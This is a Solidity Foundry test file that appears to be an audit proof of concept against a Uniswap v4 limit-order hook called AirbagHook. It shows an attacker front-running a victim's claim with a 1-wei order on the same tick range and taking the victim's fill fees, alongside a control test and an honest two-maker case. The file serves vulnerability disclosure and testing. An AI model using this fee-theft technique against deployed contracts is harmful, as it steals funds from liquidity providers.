// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {Test, console2} from "forge-std/Test.sol";
import {Deployers} from "@uniswap/v4-core/test/utils/Deployers.sol";
import {IHooks} from "@uniswap/v4-core/src/interfaces/IHooks.sol";
import {Hooks} from "@uniswap/v4-core/src/libraries/Hooks.sol";
import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";
import {StateLibrary} from "@uniswap/v4-core/src/libraries/StateLibrary.sol";
import {TickMath} from "@uniswap/v4-core/src/libraries/TickMath.sol";
import {SwapParams, ModifyLiquidityParams} from "@uniswap/v4-core/src/types/PoolOperation.sol";
import {PoolSwapTest} from "@uniswap/v4-core/src/test/PoolSwapTest.sol";
import {HookMiner} from "v4-periphery/test/shared/HookMiner.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {AirbagHook} from "../src/AirbagHook.sol";
import {AirbagOrders} from "../src/AirbagOrders.sol";

contract ZzSharedPosPoc is Test, Deployers {
    using StateLibrary for IPoolManager;

    AirbagHook internal hook;
    address internal alice = address(0xA11CE);
    address internal mallory = address(0xBAD);

    function setUp() public {
        deployFreshManagerAndRouters();
        (currency0, currency1) = deployMintAndApprove2Currencies();

        uint160 flags =
            uint160(Hooks.BEFORE_SWAP_FLAG | Hooks.AFTER_SWAP_FLAG | Hooks.AFTER_SWAP_RETURNS_DELTA_FLAG);
        (address predicted, bytes32 salt) =
            HookMiner.find(address(this), flags, type(AirbagHook).creationCode, abi.encode(address(manager)));
        hook = new AirbagHook{salt: salt}(manager);
        assertEq(address(hook), predicted);

        (key,) = initPoolAndAddLiquidity(currency0, currency1, IHooks(address(hook)), 500, SQRT_PRICE_1_1);
        modifyLiquidityRouter.modifyLiquidity(
            key,
            ModifyLiquidityParams({tickLower: -6000, tickUpper: 6000, liquidityDelta: 1_000e18, salt: bytes32(0)}),
            ""
        );
        deal(Currency.unwrap(currency0), address(this), 50_000 ether);
        deal(Currency.unwrap(currency1), address(this), 50_000 ether);

        _fund(alice);
        _fund(mallory);
    }

    function _fund(address who) internal {
        deal(Currency.unwrap(currency0), who, 1000 ether);
        deal(Currency.unwrap(currency1), who, 1000 ether);
        vm.startPrank(who);
        IERC20(Currency.unwrap(currency0)).approve(address(hook), type(uint256).max);
        IERC20(Currency.unwrap(currency1)).approve(address(hook), type(uint256).max);
        vm.stopPrank();
    }

    function _pushTo(int24 targetTick) internal {
        (, int24 cur,,) = manager.getSlot0(key.toId());
        if (targetTick == cur) return;
        bool up = targetTick > cur;
        swapRouter.swap(
            key,
            SwapParams({
                zeroForOne: !up,
                amountSpecified: -5_000 ether,
                sqrtPriceLimitX96: TickMath.getSqrtPriceAtTick(targetTick)
            }),
            PoolSwapTest.TestSettings({takeClaims: false, settleUsingBurn: false}),
            ""
        );
    }

    function _bal(address who) internal view returns (uint256 b0, uint256 b1) {
        b0 = IERC20(Currency.unwrap(currency0)).balanceOf(who);
        b1 = IERC20(Currency.unwrap(currency1)).balanceOf(who);
    }

    // ── CONTROL: nobody interferes; Alice claims and receives principal + her own fill fee ──
    function test_control_aliceGetsHerFee() public {
        vm.prank(alice);
        uint256 id = hook.createOrder(key, 10, 5e18);
        _pushTo(410);

        AirbagOrders.Order memory o = hook.orderOf(id);
        assertTrue(o.filled, "filled");
        console2.log("control rebate0", o.rebate0);
        console2.log("control rebate1", o.rebate1);

        (uint256 a0, uint256 a1) = _bal(alice);
        vm.prank(alice);
        hook.claimOrder(id, key);
        (uint256 b0, uint256 b1) = _bal(alice);
        console2.log("CONTROL alice got0", b0 - a0);
        console2.log("CONTROL alice got1", b1 - a1);
    }

    // ── POC: Mallory front-runs the claim with a 1-wei order on the same tick range ──
    function test_poc_sharedPosition_feeTheft() public {
        vm.prank(alice);
        uint256 id = hook.createOrder(key, 10, 5e18);
        _pushTo(410);

        AirbagOrders.Order memory o = hook.orderOf(id);
        assertTrue(o.filled, "filled");

        // Mallory adds 1 unit of liquidity to the SAME [10,20] range (now below market, so it is
        // a legal currency1-funded order).
        (uint256 m0, uint256 m1) = _bal(mallory);
        vm.prank(mallory);
        uint256 mid = hook.createOrder(key, 10, 1);
        (uint256 n0, uint256 n1) = _bal(mallory);
        console2.log("POC mallory delta0 (int)", int256(n0) - int256(m0));
        console2.log("POC mallory delta1 (int)", int256(n1) - int256(m1));

        // ...and takes her 1 wei back out.
        vm.prank(mallory);
        hook.cancelOrder(mid, key);
        (uint256 p0, uint256 p1) = _bal(mallory);
        console2.log("POC mallory NET delta0", int256(p0) - int256(m0));
        console2.log("POC mallory NET delta1", int256(p1) - int256(m1));

        (uint256 a0, uint256 a1) = _bal(alice);
        vm.prank(alice);
        hook.claimOrder(id, key);
        (uint256 b0, uint256 b1) = _bal(alice);
        console2.log("POC alice got0", b0 - a0);
        console2.log("POC alice got1", b1 - a1);
    }

    // ── No attacker at all: two honest makers on the same tick, first claimer takes both fees ──
    function test_twoHonestMakers_firstClaimerTakesAll() public {
        vm.prank(alice);
        uint256 idA = hook.createOrder(key, 10, 5e18);
        vm.prank(mallory);
        uint256 idB = hook.createOrder(key, 10, 5e18);
        _pushTo(410);

        assertTrue(hook.orderOf(idA).filled && hook.orderOf(idB).filled, "both filled");

        (uint256 a0, uint256 a1) = _bal(alice);
        vm.prank(alice);
        hook.claimOrder(idA, key);
        (uint256 b0, uint256 b1) = _bal(alice);
        console2.log("FIRST claimer (alice) got1", b1 - a1);
        console2.log("FIRST claimer (alice) got0", b0 - a0);

        (uint256 c0, uint256 c1) = _bal(mallory);
        vm.prank(mallory);
        hook.claimOrder(idB, key);
        (uint256 d0, uint256 d1) = _bal(mallory);
        console2.log("SECOND claimer (bob) got1", d1 - c1);
        console2.log("SECOND claimer (bob) got0", d0 - c0);
    }
}
